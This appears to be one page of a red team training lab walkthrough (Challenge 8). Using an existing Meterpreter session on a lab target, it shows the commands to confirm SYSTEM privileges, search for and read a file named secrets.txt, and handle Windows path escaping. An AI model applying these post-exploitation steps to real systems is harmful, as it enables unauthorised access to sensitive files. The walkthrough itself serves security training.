# **Challenge 8: Finding Sensitive Files**
!!! note ""
## **Procedure:**

With access gained on the final target server, the last step is to grab the flag and claim victory. 

- Using your Meterpreter shell, search the target server for a file named secrets.txt .
- Read the contents of the file, and include them in your report.

    **Note**: If you have found the filepath but get errors trying to open the file, it is likely a syntax issue. Using Windows-style filepaths in a Linux command line can be difficult, since Windows uses backslashes instead of forward slashes in paths, which your command line will interpret as an escape sequence instead of a literal backslash.  There are two good workarounds for this:

    - Put quotes around the filepath in your command, like "C:\Windows\system32\file.txt"
    - Alternatively, you can use double slashes in place of the forward slashes: C:\\Windows\\system32\\file.txt

## **Solution:**

### Finding the file secrets.txt.

```bash linenums="1" hl_lines="1 2"
meterpreter > getsystem
[-] Already running as SYSTEM
meterpreter > search -f secrets.txt
Found 1 result...
=================

Path                          Size (bytes)  Modified (UTC)
----                          ------------  --------------
c:\Windows\debug\secrets.txt  55            2022-11-05 22:01:13 +0000

```
### Reading the file secrets.txt.

```bash linenums="1" hl_lines="1 3 9"
meterpreter > cat c:\\Windows\\debug\\secrets.txt
Congratulations! You have finished the red team course!meterpreter > 
```

![alt text](images/Pasted%20image%2020240508010646.png)

## Congratulations! You have finished the red team course!

!!! note ""

<div class="button-container" markdown="1">
<a href="/Career-Simulation-3/challenge_6/" class="md-button md-button--primary">Previous: Challenge 6</a>
<a href="/Career-Simulation-3/" class="md-button md-button--secondary">Home 🏠</a>
<a href="/Career-Simulation-3/report/" class="md-button md-button--primary">Next: Report</a>
</div>


